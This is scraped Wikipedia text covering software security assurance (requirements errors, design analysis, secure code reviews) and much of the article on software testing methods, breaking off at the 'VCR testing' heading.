All security vulnerabilities in software are the result of 
security bugs
, or defects, within the software. In most cases, these defects are created by two primary causes: (1) non-conformance, or a failure to satisfy requirements; and (2) an error or omission in the software requirements.



Non-conformance, or a failure to satisfy requirements
[
edit
]


A non-conformance may be simple–the most common is a coding error or defect–or more complex (i.e., a subtle timing error or input validation error). The important point about non-conformance is that 
verification and validation
 techniques are designed to detect them and security assurance techniques are designed to prevent them. Improvements in these methods, through a software security assurance program, can improve the security of software.



Errors or omissions in software requirements
[
edit
]


The most serious security problems with software-based systems are those that develop when the software requirements are incorrect, inappropriate, or incomplete for the system situation. Unfortunately, errors or omissions in requirements are more difficult to identify. For example, the software may perform exactly as required under normal use, but the requirements may not correctly deal with some 
system state
. When the system enters this problem state, unexpected and undesirable behavior may result. This type of problem cannot be handled within the software discipline; it results from a failure of the system and software engineering processes which developed and allocated the system requirements to the software.



Software security assurance activities
[
edit
]


There are two basic types of Software Security Assurance activities.



Some focus on ensuring that information processed by an information system is assigned a proper sensitivity category, and that the appropriate protection requirements have been developed and met in the system.


Others focus on ensuring the control and protection of the software, as well as that of the software support tools and data.


At a minimum, a software security assurance program should ensure that:



A security evaluation has been performed for the software.


Security requirements have been established for the software.


Security requirements have been established for the software development and/or operations and maintenance (O&M) processes.


Each software review, or audit, includes an evaluation of the security requirements.


A 
configuration management
 and 
corrective action
 process is in place to provide security for the existing software and to ensure that any proposed changes do not inadvertently create security violations or 
vulnerabilities
.


Physical security for the software is adequate.


Building in security
[
edit
]


Improving the software development process and building better software are ways to improve 
software security
, by producing software with fewer defects and vulnerabilities. A first-order approach is to identify the critical software components that control security-related functions and pay special attention to them throughout the development and testing process. This approach helps to focus scarce security resources on the most critical areas.



Tools and techniques
[
edit
]


There are many 
commercial off-the-shelf
 (COTS) software packages that are available to support software security assurance activities. However, before they are used, these tools must be carefully evaluated and their effectiveness must be assured.



Common weaknesses enumeration
[
edit
]


One way to improve software security is to gain a better understanding of the most common 
weaknesses
 that can affect software security. With that in mind, there is a current community-based program called the Common Weaknesses Enumeration project,
[
2
]
 which is sponsored by The 
Mitre Corporation
 to identify and describe such weaknesses. The list, which is currently in a very preliminary form, contains descriptions of common software weaknesses, faults, and flaws.



Security architecture/design analysis
[
edit
]


Security architecture
/design analysis verifies that the software design correctly implements security requirements. Generally speaking, there are four basic techniques that are used for security architecture/design analysis.

[
3
]
[
4
]




Logic analysis
[
edit
]


Logic analysis evaluates the 
equations
, 
algorithms
, and 
control logic
 of the software design.



Data analysis
[
edit
]


Data analysis evaluates the description and intended usage of each data item used in design of the 
software component
. The use of interrupts and their effect on data should receive special attention to ensure interrupt handling routines do not alter critical data used by other routines.



Interface analysis
[
edit
]


Interface
 analysis verifies the proper design of a software component's interfaces with other components of the system, including 
computer hardware
, software, and 
end-users
.



Constraint analysis
[
edit
]


Constraint analysis evaluates the design of a software component against restrictions imposed by requirements and real-world limitations. The design must be responsive to all known or anticipated restrictions on the software component. These restrictions may include timing, sizing, and throughput constraints, input and output data limitations, equation and algorithm limitations, and other design limitations.



Secure code reviews, inspections, and walkthroughs
[
edit
]


Code analysis verifies that the software 
source code
 is written correctly, implements the desired design, and does not violate any security requirements. Generally speaking, the techniques used in the performance of code analysis mirror those used in design analysis.

Secure 
Code reviews
 are conducted during and at the end of the development phase to determine whether established security requirements, security design concepts, and security-related specifications have been satisfied. These reviews typically consist of the presentation of material to a review group. Secure code reviews are most effective when conducted by personnel who have not been directly involved in the development of the software being reviewed.



Informal reviews
[
edit
]


Informal secure code reviews can be conducted on an as-needed basis. To conduct an informal review, the developer simply selects one or more reviewer(s) and provides and/or presents the material to be reviewed. The material may be as informal as 
pseudo-code
 or hand-written documentation.



Formal reviews
[
edit
]


Formal secure code reviews are conducted at the end of the development phase for each software component. The client of the software appoints the formal review group, who may make or affect a "go/no-go" decision to proceed to the next step of the 
software development life cycle
.



Inspections and walkthroughs
[
edit
]


A secure code inspection or walkthrough is a detailed examination of a product on a step-by-step or line-by-line (of 
source code
) basis. The purpose of conducting secure code inspections or walkthroughs is to find errors. Typically, the group that does an inspection or walkthrough is composed of peers from development, 
security engineering
 and 
quality assurance
.



Security testing
[
edit
]


Software 
security testing
, which includes 
penetration testing
, confirms the results of design and code analysis, investigates software behaviour, and verifies that the software complies with security requirements. Special security testing, conducted in accordance with a security test plan and procedures, establishes the compliance of the software with the security requirements. Security testing focuses on locating software weaknesses and identifying extreme or unexpected situations that could cause the software to fail in ways that would cause a violation of security requirements. Security testing efforts are often limited to the software requirements that are classified as "critical" security items.



See also
[
edit
]


Secure by design


Computer security


Security engineering


Software protection


References
[
edit
]






^
 
Goertzel, Karen M.; Winograd, Theodore; McKinley, Holly L.; Oh, Lyndon J.; Colon, Michael; McGibbon, Thomas; Fedchak, Elaine; Vienneau, Robert (2007-07-31). 
"Software Security Assurance: A State-of-Art Report (SAR)"
. Fort Belvoir, VA. 
doi
:
10.21236/ada472363
.
 
{{
cite journal
}}
: 
Cite journal requires 
|journal=
 (
help
)




^
 
"Common Weaknesses Enumeration Project"
. Retrieved 
26 August
 2010
.




^
 
Web Application Security Testing




^
 
"A Catalog of Security Architecture Weaknesses". 2017 IEEE International Conference on Software Architecture (ICSA). doi:10.1109/ICSAW.2017.25.






v
t
e
Information security
Related security categories


Computer security


Automotive security


Cybercrime


Cybersex trafficking


Computer fraud


Cybergeddon


Cyberterrorism


Cyberwarfare


Electromagnetic warfare


Information warfare


Internet security


Mobile security


Network security


Copy protection


Digital rights management


vectorial version
Threats


Adware


Advanced persistent threat


Arbitrary code execution


Backdoors


Bombs

Fork


Logic


Time


Zip


Hardware backdoors


Code injection


Crimeware


Cross-site scripting


Cross-site leaks


DOM clobbering


History sniffing


Cryptojacking


Botnets


Data breach


Drive-by download


Browser Helper Objects


Viruses


Data scraping


Denial-of-service attack


Eavesdropping


Email fraud


Email spoofing


Exploits


Fraudulent dialers


Hacktivism


Infostealer


Insecure direct object reference


Keystroke loggers


Malware


Payload


Phishing


Voice


Polymorphic engine


Privilege escalation


Ransomware


Rootkits


Scareware


Shellcode


Spamming


Social engineering


Spyware


Software bugs


Trojan horses


Hardware Trojans


Remote access trojans


Vulnerability


Web shells


Wiper


Worms


SQL injection


Rogue security software


Zombie


Defenses


Application security


Secure coding


Secure by default


Secure by design


Misuse case


Computer access control


Authentication


Multi-factor authentication


Authorization


Computer security software


Antivirus software


Security-focused operating system


Data-centric security


Obfuscation (software)


Data masking


Encryption


Firewall


Intrusion detection system


Host-based intrusion detection system
 (HIDS)


Anomaly detection


Information security management


Information risk management


Security information and event management
 (SIEM)


Runtime application self-protection


Site isolation












Retrieved from "
https://en.wikipedia.org/w/index.php?title=Software_security_assurance&oldid=1182984854
"


Categories
: 
Security engineering
Software quality
Hidden categories: 
CS1 errors: missing periodical
Articles needing additional references from December 2010
All articles needing additional references
Wikipedia articles with style issues from June 2014
All articles with style issues
Articles with multiple maintenance issues











From Wikipedia, the free encyclopedia






Checking software against a standard






Part of a series on
Software development


Core activities


Data modeling


Processes


Requirements


Design


Construction


Engineering


Testing


Debugging


Deployment


Maintenance




Paradigms and models


Agile


Cleanroom


Incremental


Prototyping


Spiral


V model


Waterfall




Methodologies
 and frameworks


ASD


DevOps


DAD


DSDM


FDD


IID


Kanban


Lean SD


LeSS


MDD


MSF


PSP


RAD


RUP


SAFe


Scrum


SEMAT


TDD


TSP


UP


XP




Supporting disciplines


Configuration management


 Deployment management


Documentation


Software quality assurance


Project management


User experience




Practices


ATDD


BDD


CCO


CI


CD


DDD


PP


SBE


Stand-up


TDD




Tools


Compiler


Debugger


Profiler


GUI designer


UML Modeling


IDE


Build automation


Release automation


Infrastructure as code




Standards and bodies of knowledge


CMMI


IEEE standards


ISO 9001


ISO/IEC standards


PMBOK


SWEBOK


ITIL


IREB


OMG




Glossaries


Artificial intelligence


Computer science


Electrical and electronics engineering




Outlines


Outline of software development


v
t
e


TestingCup – Polish Championship in Software Testing, 
Katowice
, May 2016


Software testing
 is the act of checking whether 
software
 satisfies expectations. 

Software testing can provide objective, independent information about the 
quality
 of software and the 
risk
 of its failure to a 
user
 or sponsor.
[
1
]


Software testing can determine the 
correctness
 of software for specific 
scenarios
, but cannot determine correctness for all scenarios.
[
2
]
 
[
3
]
 It cannot find all 
bugs
.

Based on the criteria for measuring correctness from an 
oracle
, software testing employs principles and mechanisms that might recognize a problem. Examples of oracles include: 
specifications
, 
contracts
,
[
4
]
 comparable products, past versions of the same product, inferences about intended or expected purpose, user or customer expectations, relevant standards, applicable laws.

Software testing is often dynamic in nature; running the software to verify actual output matches expected. It can also be static in nature; reviewing 
code
 and its associated 
documentation
.

Software testing is often used to answer the question: Does the software do what it is supposed to do and what it needs to do?

Information learned from software testing may be used to improve the process by which software is developed.
[
5
]
: 41–43 


Software testing should follow a "pyramid" approach wherein most of your tests should be 
unit tests
, followed by 
integration tests
 and finally 
end to end (e2e) tests
 should have the lowest proportion.
[
6
]
[
7
]
[
8
]






Economics
[
edit
]


A study conducted by 
NIST
 in 2002 reported that software bugs cost the U.S. economy $59.5 billion annually. More than a third of this cost could be avoided, if better software testing was performed.
[
9
]
[
dubious
 – 
discuss
]


Outsourcing
 software testing because of costs is very common, with China, the Philippines, and India being preferred destinations.
[
citation needed
]




History
[
edit
]


Glenford J. Myers
 initially introduced the separation of 
debugging
 from testing in 1979.
[
10
]
 Although his attention was on breakage testing ("A successful test case is one that detects an as-yet undiscovered error."
[
10
]
: 16 
), it illustrated the desire of the software engineering community to separate fundamental development activities, such as debugging, from that of verification.



Goals
[
edit
]


Software testing is typically goal driven.



Finding bugs
[
edit
]


Software testing typically includes handling software bugs – a defect in the 
code
 that causes an undesirable result.
[
11
]
: 31 
 Bugs generally slow testing progress and involve 
programmer
 assistance to 
debug
 and fix.

Not all defects cause a failure. For example, a defect in 
dead code
 will not be considered a failure. 

A defect that does not cause failure at one point in time may later occur due to environmental changes. Examples of environment change include running on new 
computer hardware
, changes in 
data
, and interacting with different software.
[
12
]


A single defect may result in multiple failure symptoms.



Ensuring requirements are satisfied
[
edit
]


Software testing may involve a Requirements gap – omission from the design for a requirement.
[
5
]
: 426 
 Requirement gaps can often be 
non-functional requirements
 such as 
testability
, 
scalability
, 
maintainability
, 
performance
, and 
security
.



Code coverage
[
edit
]


A fundamental limitation of software testing is that testing under 
all
 combinations of inputs and preconditions (initial state) is not feasible, even with a simple product.
[
3
]
: 17–18 
[
13
]
 
Defects that manifest in unusual conditions are difficult to find in testing. Also, 
non-functional
 dimensions of quality (how it is supposed to 
be
 versus what it is supposed to 
do
) – 
usability
, 
scalability
, 
performance
, 
compatibility
, and 
reliability
 – can be subjective; something that constitutes sufficient value to one person may not to another.

Although testing for every possible input is not feasible, testing can use 
combinatorics
 to maximize coverage while minimizing tests.
[
14
]




Categorization
[
edit
]






Main article: 
Software testing tactics


Testing can be categorized many ways.
[
15
]




Automated testing
[
edit
]


This paragraph is an excerpt from 
Test automation
.
[
edit
]

In software testing, 
test automation
 is the use of  
software
 separate from the software being tested to control the execution of tests and the comparison of actual outcomes with predicted outcomes.
[
16
]
 Test automation can automate some repetitive but necessary tasks in a formalized testing process already in place, or perform additional testing that would be difficult to do manually. Test automation is critical for 
continuous delivery
 and 
continuous testing
.
[
17
]


Levels
[
edit
]


Software testing can be categorized into levels based on how much of the 
software system
 is the focus of a test.
[
18
]
[
19
]
[
20
]
[
21
]




Unit testing
[
edit
]


This paragraph is an excerpt from 
Unit testing
.
[
edit
]


Unit testing
, a.k.a. component or module testing, is a form of software testing by which isolated 
source code
 is tested to validate expected behavior.
[
22
]


Integration testing
[
edit
]


This paragraph is an excerpt from 
Integration testing
.
[
edit
]


Integration testing
, also called integration and testing, abbreviated I&T, is a form of software testing in which multiple parts of a 
software system
 are tested as a group.


System testing
[
edit
]


This paragraph is an excerpt from 
System testing
.
[
edit
]


System testing
, a.k.a. end-to-end (E2E) testing, is testing conducted on a complete 
software system
.


Static, dynamic, and passive testing
[
edit
]


There are many approaches to software testing. 
Reviews
, 
walkthroughs
, or 
inspections
 are referred to as static testing, whereas executing programmed code with a given set of 
test cases
 is referred to as 
dynamic testing
.
[
23
]
[
24
]


Static testing is often implicit, like proofreading, plus when programming tools/text editors check source code structure or compilers (pre-compilers) check syntax and data flow as 
static program analysis
. Dynamic testing takes place when the program itself is run. Dynamic testing may begin before the program is 100% complete in order to test particular sections of code and are applied to discrete 
functions
 or modules.
[
23
]
[
24
]
 Typical techniques for these are either using 
stubs
/drivers or execution from a 
debugger
 environment.
[
24
]


Static testing involves 
verification
, whereas dynamic testing also involves 
validation
.
[
24
]


Passive testing means verifying the system's behavior without any interaction with the software product. Contrary to active testing, testers do not provide any test data but look at system logs and traces. They mine for patterns and specific behavior in order to make some kind of decisions.
[
25
]
 This is related to offline 
runtime verification
 and 
log analysis
.



Exploratory
[
edit
]


This section is an excerpt from 
Exploratory testing
.
[
edit
]


Exploratory testing
 is an approach to software testing that is concisely described as simultaneous learning, 
test design
 and test execution. 
Cem Kaner
, who coined the term in 1984,
[
26
]
 defines exploratory testing as "a style of software testing that emphasizes the personal freedom and responsibility of the individual tester to continually optimize the quality of his/her work by treating test-related learning, test design, test execution, and test result interpretation as mutually supportive activities that run in parallel throughout the project."
[
27
]


Preset testing vs adaptive testing
[
edit
]


The type of testing strategy to be performed depends on whether the tests to be applied to the IUT should be decided before the testing plan starts to be executed (preset testing
[
28
]
) or whether each input to be applied to the IUT can be dynamically dependent on the outputs obtained during the application of the previous tests (adaptive testing
[
29
]
[
30
]
).



Black/white box
[
edit
]


Software testing can often be divided into white-box and black-box. These two approaches are used to describe the point of view that the tester takes when designing test cases. A hybrid approach called grey-box includes aspects of both boxes may also be applied to software testing methodology.
[
31
]
[
32
]




White-box testing
[
edit
]


Main article: 
White-box testing


White Box Testing Diagram


White-box testing (also known as clear box testing, glass box testing, transparent box testing, and structural testing) verifies the internal structures or workings of a program, as opposed to the functionality exposed to the end-user. In white-box testing, an internal perspective of the system (the source code), as well as programming skills, are used to design test cases. The tester chooses inputs to exercise paths through the code and determines the appropriate outputs.
[
31
]
[
32
]
 This is analogous to testing nodes in a circuit, e.g., 
in-circuit testing
 (ICT).

While white-box testing can be applied at the 
unit
, 
integration
, and 
system
 levels of the software testing process, it is usually done at the unit level.
[
33
]
 It can test paths within a unit, paths between units during integration, and between subsystems during a system–level test. Though this method of test design can uncover many errors or problems, it might not detect unimplemented parts of the specification or missing requirements.

Techniques used in white-box testing include:
[
32
]
[
34
]




API testing
 – testing of the application using public and private 
APIs
 (application programming interfaces)


Code coverage
 – creating tests to satisfy some criteria of code coverage (for example, the test designer can create tests to cause all statements in the program to be executed at least once)


Fault injection
 methods – intentionally introducing faults to gauge the efficacy of testing strategies


Mutation testing
 methods


Static testing
 methods


Code coverage tools can evaluate the completeness of a test suite that was created with any method, including black-box testing. This allows the software team to examine parts of a system that are rarely tested and ensures that the most important 
function points
 have been tested.
[
35
]
 Code coverage as a 
software metric
 can be reported as a percentage for:
[
31
]
[
35
]
[
36
]




Function coverage
, which reports on functions executed


Statement coverage
, which reports on the number of lines executed to complete the test


Decision coverage
, which reports on whether both the True and the False branch of a given test has been executed


100% statement coverage ensures that all code paths or branches (in terms of 
control flow
) are executed at least once. This is helpful in ensuring correct functionality, but not sufficient since the same code may process different inputs correctly or incorrectly.
[
37
]




Black-box testing
[
edit
]


Main article: 
Black-box testing


Black box diagram


Black-box testing (also known as functional testing) describes designing test cases without knowledge of the implementation, without reading the source code. The testers are only aware of what the software is supposed to do, not how it does it.
[
38
]
 Black-box testing methods include: 
equivalence partitioning
, 
boundary value analysis
, 
all-pairs testing
, 
state transition tables
, 
decision table
 testing, 
fuzz testing
, 
model-based testing
, 
use case
 testing, 
exploratory testing
, and specification-based testing.
[
31
]
[
32
]
[
36
]


Specification-based testing aims to test the functionality of software according to the applicable requirements.
[
39
]
 This level of testing usually requires thorough 
test cases
 to be provided to the tester, who then can simply verify that for a given input, the output value (or behavior), either "is" or "is not" the same as the expected value specified in the test case. Test cases are built around specifications and requirements, i.e., what the application is supposed to do. It uses external descriptions of the software, including specifications, requirements, and designs to derive test cases. These tests can be 
functional
 or 
non-functional
, though usually functional. Specification-based testing may be necessary to assure correct functionality, but it is insufficient to guard against complex or high-risk situations.
[
40
]


Black box testing can be used to any level of testing although usually not at the unit level. 
[
33
]


Component interface testing


Component interface testing is a variation of 
black-box testing
, with the focus on the data values beyond just the related actions of a subsystem component.
[
41
]
 The practice of component interface testing can be used to check the handling of data passed between various units, or subsystem components, beyond full integration testing between those units.
[
42
]
[
43
]
 The data being passed can be considered as "message packets" and the range or data types can be checked, for data generated from one unit, and tested for validity before being passed into another unit. One option for interface testing is to keep a separate log file of data items being passed, often with a timestamp logged to allow analysis of thousands of cases of data passed between units for days or weeks. Tests can include checking the handling of some extreme data values while other interface variables are passed as normal values.
[
42
]
 Unusual data values in an interface can help explain unexpected performance in the next unit.



Visual testing
[
edit
]


The aim of visual testing is to provide developers with the ability to examine what was happening at the point of software failure by presenting the data in such a way that the developer can easily find the information he or she requires, and the information is expressed clearly.
[
44
]
[
45
]


At the core of visual testing is the idea that showing someone a problem (or a test failure), rather than just describing it, greatly increases clarity and understanding. Visual testing, therefore, requires the recording of the entire test process – capturing everything that occurs on the test system in video format. Output videos are supplemented by real-time tester input via picture-in-a-picture webcam and audio commentary from microphones.

Visual testing provides a number of advantages. The quality of communication is increased drastically because testers can show the problem (and the events leading up to it) to the developer as opposed to just describing it and the need to replicate test failures will cease to exist in many cases. The developer will have all the evidence he or she requires of a test failure and can instead focus on the cause of the fault and how it should be fixed.

Ad hoc testing
 and 
exploratory testing
 are important methodologies for checking software integrity, because they require less preparation time to implement, while the important bugs can be found quickly.
[
46
]
 In ad hoc testing, where testing takes place in an improvised impromptu way, the ability of the tester(s) to base testing off documented methods and then improvise variations of those tests can result in more rigorous examination of defect fixes.
[
46
]
 However, unless strict documentation of the procedures are maintained, one of the limits of ad hoc testing is lack of repeatability.
[
46
]




Further information: 
Graphical user interface testing


Grey-box testing
[
edit
]


Main article: 
Gray box testing


Grey-box testing (American spelling: gray-box testing) involves using knowledge of internal data structures and algorithms for purposes of designing tests while executing those tests at the user, or black-box level. The tester will often have access to both "the source code and the executable binary."
[
47
]
 Grey-box testing may also include 
reverse engineering
 (using dynamic code analysis) to determine, for instance, boundary values or error messages.
[
47
]
 Manipulating input data and formatting output do not qualify as grey-box, as the input and output are clearly outside of the "black box" that we are calling the system under test. This distinction is particularly important when conducting 
integration testing
 between two modules of code written by two different developers, where only the interfaces are exposed for the test.

By knowing the underlying concepts of how the software works, the tester makes better-informed testing choices while testing the software from outside. Typically, a grey-box tester will be permitted to set up an isolated testing environment with activities such as seeding a 
database
. The tester can observe the state of the product being tested after performing certain actions such as executing 
SQL
 statements against the database and then executing queries to ensure that the expected changes have been reflected. Grey-box testing implements intelligent test scenarios, based on limited information. This will particularly apply to data type handling, 
exception handling
, and so on.
[
48
]


With the concept of grey-box testing, this "arbitrary distinction" between black- and white-box testing has faded somewhat.
[
33
]




Installation testing
[
edit
]


This section is an excerpt from 
Installation testing
.
[
edit
]


Most software systems have installation procedures that are needed before they can be used for their main purpose. Testing these procedures to achieve an installed software system that may be used is known as 
installation testing
.
[
49
]
: 139 
 These procedures may involve full or partial upgrades, and install/uninstall processes.



A user must select a variety of options.


Dependent files and libraries must be allocated, loaded or located.


Valid hardware configurations must be present.


Software systems may need connectivity to connect to other software systems.
[
49
]
: 145 


Compatibility testing
[
edit
]


Main article: 
Compatibility testing


A common cause of software failure (real or perceived) is a lack of its 
compatibility
 with other 
application software
, 
operating systems
 (or operating system 
versions
, old or new), or target environments that differ greatly from the original (such as a 
terminal
 or 
GUI
 application intended to be run on the 
desktop
 now being required to become a 
Web application
, which must render in a 
Web browser
). For example, in the case of a lack of 
backward compatibility
, this can occur because the programmers develop and test software only on the latest version of the target environment, which not all users may be running. This results in the unintended consequence that the latest work may not function on earlier versions of the target environment, or on older hardware that earlier versions of the target environment were capable of using. Sometimes such issues can be fixed by proactively 
abstracting
 operating system functionality into a separate program 
module
 or 
library
.



Smoke and sanity testing
[
edit
]


Main article: 
Smoke testing (software)


Sanity testing
 determines whether it is reasonable to proceed with further testing.

Smoke testing
 consists of minimal attempts to operate the software, designed to determine whether there are any basic problems that will prevent it from working at all. Such tests can be used as 
build verification test
.



Regression testing
[
edit
]


Main article: 
Regression testing


Regression testing focuses on finding defects after a major code change has occurred. Specifically, it seeks to uncover 
software regressions
, as degraded or lost features, including old bugs that have come back. Such regressions occur whenever software functionality that was previously working correctly, stops working as intended. Typically, regressions occur as an 
unintended consequence
 of program changes, when the newly developed part of the software collides with the previously existing code. Regression testing is typically the largest test effort in commercial software development,
[
50
]
 due to checking numerous details in prior software features, and even new software can be developed while using some old test cases to test parts of the new design to ensure prior functionality is still supported.

Common methods of regression testing include re-running previous sets of test cases and checking whether previously fixed faults have re-emerged. The depth of testing depends on the phase in the release process and the 
risk
 of the added features. They can either be complete, for changes added late in the release or deemed to be risky, or be very shallow, consisting of positive tests on each feature, if the changes are early in the release or deemed to be of low risk.



Acceptance testing
[
edit
]


Main article: 
Acceptance testing


Acceptance testing is system-level testing to ensure the software meets customer expectations.
[
51
]
[
52
]
[
53
]
[
54
]


Acceptance testing may be performed as part of the hand-off process between any two phases of development.
[
citation needed
]


Tests are frequently grouped into these levels by where they are performed in the software development process, or by the level of specificity of the test.
[
54
]




User acceptance testing (UAT)


Operational acceptance testing (OAT)


Contractual and regulatory acceptance testing


Alpha and beta testing


Sometimes, UAT is performed by the customer, in their environment and on their own hardware.

OAT is used to conduct operational readiness (pre-release) of a product, service or system as part of a 
quality management system
. OAT is a common type of non-functional software testing, used mainly in 
software development
 and 
software maintenance
 projects. This type of testing focuses on the operational readiness of the system to be supported, or to become part of the production environment. Hence, it is also known as operational readiness testing (ORT) or 
Operations readiness and assurance
 (OR&A) testing. 
Functional testing
 within OAT is limited to those tests that are required to verify the 
non-functional
 aspects of the system.

In addition, the software testing should ensure that the portability of the system, as well as working as expected, does not also damage or partially corrupt its operating environment or cause other processes within that environment to become inoperative.
[
55
]


Contractual acceptance testing is performed based on the contract's acceptance criteria defined during the agreement of the contract, while regulatory acceptance testing is performed based on the relevant regulations to the software product. Both of these two tests can be performed by users or independent testers. Regulation acceptance testing sometimes involves the regulatory agencies auditing the test results.
[
54
]




Alpha testing
[
edit
]


Alpha testing is simulated or actual operational testing by potential users/customers or an independent test team at the developers' site. Alpha testing is often employed for off-the-shelf software as a form of internal acceptance testing before the software goes to beta testing.
[
56
]




Beta testing
[
edit
]


See also: 
Software release life cycle § Beta


Beta testing comes after alpha testing and can be considered a form of external 
user acceptance testing
. Versions of the software, known as 
beta versions
, are released to a limited audience outside of the programming team known as beta testers. The software is released to groups of people so that further testing can ensure the product has few faults or 
bugs
. Beta versions can be made available to the open public to increase the 
feedback
 field to a maximal number of future users and to deliver value earlier, for an extended or even indefinite period of time (
perpetual beta
).
[
57
]




Functional vs non-functional testing
[
edit
]


Functional testing
 refers to activities that verify a specific action or function of the code. These are usually found in the code requirements documentation, although some development methodologies work from use cases or user stories. Functional tests tend to answer the question of "can the user do this" or "does this particular feature work."

Non-functional testing
 refers to aspects of the software that may not be related to a specific function or user action, such as 
scalability
 or other 
performance
, behavior under certain 
constraints
, or 
security
. Testing will determine the breaking point, the point at which extremes of scalability or performance leads to unstable execution. Non-functional requirements tend to be those that reflect the quality of the product, particularly in the context of the suitability perspective of its users.



Continuous testing
[
edit
]


Main article: 
Continuous testing


Continuous testing is the process of executing 
automated tests
 as part of the software delivery pipeline to obtain immediate feedback on the business risks associated with a software release candidate.
[
58
]
[
59
]
 Continuous testing includes the validation of both 
functional requirements
 and 
non-functional requirements
; the scope of testing extends from validating bottom-up requirements or user stories to assessing the system requirements associated with overarching business goals.
[
60
]
[
61
]




Destructive testing
[
edit
]


Main article: 
Destructive testing


Destructive testing attempts to cause the software or a sub-system to fail. It verifies that the software functions properly even when it receives invalid or unexpected inputs, thereby establishing the 
robustness
 of input validation and error-management routines.
[
citation needed
]
 
Software fault injection
, in the form of 
fuzzing
, is an example of failure testing. Various commercial non-functional testing tools are linked from the 
software fault injection
 page; there are also numerous open-source and free software tools available that perform destructive testing.



Further information: 
Exception handling
 and 
Recovery testing


Software performance testing
[
edit
]


Main article: 
Software performance testing


Performance testing is generally executed to determine how a system or sub-system performs in terms of responsiveness and stability under a particular workload. It can also serve to investigate, measure, validate or verify other quality attributes of the system, such as scalability, reliability and resource usage.

Load testing
 is primarily concerned with testing that the system can continue to operate under a specific load, whether that be large quantities of data or a large number of 
users
. This is generally referred to as software 
scalability
. The related load testing activity of when performed as a non-functional activity is often referred to as 
endurance testing
. 
Volume testing
 is a way to test software functions even when certain components (for example a file or database) increase radically in size. 
Stress testing
 is a way to test reliability under unexpected or rare workloads. 
Stability testing
 (often referred to as load or endurance testing) checks to see if the software can continuously function well in or above an acceptable period.

There is little agreement on what the specific goals of performance testing are. The terms load testing, performance testing, 
scalability testing
, and volume testing, are often used interchangeably.

Real-time software
 systems have strict timing constraints. To test if timing constraints are met, 
real-time testing
 is used.



Usability testing
[
edit
]


Usability testing
 is to check if the user interface is easy to use and understand. It is concerned mainly with the use of the application. This is not a kind of testing that can be automated; actual human users are needed, being monitored by skilled 
UI designers
.



Accessibility testing
[
edit
]


Accessibility
 testing is done to ensure that the software is accessible to persons with disabilities. Some of the common web accessibility tests are 



Ensuring that the color contrast between the font and the background color is appropriate


Font Size


Alternate Texts for multimedia content


Ability to use the system using the computer keyboard in addition to the mouse.


Common Standards for compliance




Americans with Disabilities Act of 1990


Section 508 Amendment to the Rehabilitation Act of 1973


Web Accessibility Initiative
 (WAI) of the 
World Wide Web Consortium
 (W3C)


Security testing
[
edit
]


Security testing
 is essential for software that processes confidential data to prevent 
system intrusion
 by 
hackers
.

The International Organization for Standardization (ISO) defines this as a "type of testing conducted to evaluate the degree to which a test item, and associated data and information, are protected so that unauthorised persons or systems cannot use, read or modify them, and authorized persons or systems are not denied access to them."
[
62
]




Internationalization and localization
[
edit
]


Testing for 
internationalization and localization
 validates that the software can be used with different languages and geographic regions. The process of 
pseudolocalization
 is used to test the ability of an application to be translated to another language, and make it easier to identify when the localization process may introduce new bugs into the product.

Globalization testing verifies that the software is adapted for a new culture (such as different currencies or time zones).
[
63
]


Actual translation to human languages must be tested, too. Possible localization and globalization failures include:



Software is often localized by translating a list of 
strings
 out of context, and the translator may choose the wrong translation for an ambiguous source string.


Technical terminology may become inconsistent, if the project is translated by several people without proper coordination or if the translator is imprudent.


Literal word-for-word translations may sound inappropriate, artificial or too technical in the target language.


Untranslated messages in the original language may be left 
hard coded
 in the source code.


Some messages may be created automatically at 
run time
 and the resulting string may be ungrammatical, functionally incorrect, misleading or confusing.


Software may use a 
keyboard shortcut
 that has no function on the source language's 
keyboard layout
, but is used for typing characters in the layout of the target language.


Software may lack support for the 
character encoding
 of the target language.


Fonts and font sizes that are appropriate in the source language may be inappropriate in the target language; for example, 
CJK characters
 may become unreadable, if the font is too small.


A string in the target language may be longer than the software can handle. This may make the string partly invisible to the user or cause the software to crash or malfunction.


Software may lack proper support for reading or writing 
bi-directional text
.


Software may display images with text that was not localized.


Localized operating systems may have differently named system 
configuration files
 and 
environment variables
 and different 
formats for date
 and 
currency
.


Development testing
[
edit
]


Main article: 
Development testing


Development Testing is a software development process that involves the synchronized application of a broad spectrum of defect prevention and detection strategies in order to reduce software development risks, time, and costs. It is performed by the software developer or engineer during the construction phase of the software development lifecycle. Development Testing aims to eliminate construction errors before code is promoted to other testing; this strategy is intended to increase the quality of the resulting software as well as the efficiency of the overall development process.

Depending on the organization's expectations for software development, Development Testing might include 
static code analysis
, data flow analysis, metrics analysis, peer code reviews, unit testing, code coverage analysis, 
traceability
, and other software testing practices.



A/B testing
[
edit
]


Main article: 
A/B testing


A/B testing is a method of running a controlled experiment to determine if a proposed change is more effective than the current approach. Customers are routed to either a current version (control) of a feature, or to a modified version (treatment) and data is collected to determine which version is better at achieving the desired outcome.



Concurrent testing
[
edit
]


Main article: 
Concurrent testing


Concurrent or concurrency testing assesses the behaviour and performance of software and systems that use 
concurrent computing
, generally under normal usage conditions. Typical problems this type of testing will expose are deadlocks, race conditions and problems with shared memory/resource handling.



Conformance testing or type testing
[
edit
]


Main article: 
Conformance testing


In software testing, conformance testing verifies that a product performs according to its specified standards. Compilers, for instance, are extensively tested to determine whether they meet the recognized standard for that language.



Output comparison testing
[
edit
]


Creating a display expected output, whether as 
data comparison
 of text or screenshots of the UI,
[
3
]
: 195 
 is sometimes called snapshot testing or Golden Master Testing unlike many other forms of testing, this cannot detect failures automatically and instead requires that a human evaluate the output for inconsistencies.



Property testing
[
edit
]


Not to be confused with 
property testing algorithms
.


Property testing is a testing technique where, instead of asserting that specific inputs produce specific expected outputs, the practitioner randomly generates many inputs, runs the program on all of them, and asserts the truth of some "property" that should be true for every pair of input and output. For example, every output from a serialization function should be accepted by the corresponding deserialization function, and every output from a sort function should be a monotonically increasing list containing exactly the same elements as its input.

Property testing libraries allow the user to control the strategy by which random inputs are constructed, to ensure coverage of degenerate cases, or inputs featuring specific patterns that are needed to fully exercise aspects of the implementation under test.

Property testing is also sometimes known as "generative testing" or "QuickCheck testing" since it was introduced and popularized by the Haskell library 
QuickCheck
.
[
64
]




Metamorphic testing
[
edit
]


Main article: 
Metamorphic testing


Metamorphic testing (MT) is a property-based software testing technique, which can be an effective approach for addressing the test oracle problem and test case generation problem. The test oracle problem is the difficulty of determining the expected outcomes of selected test cases or to determine whether the actual outputs agree with the expected outcomes.



VCR testing
[
edit
]


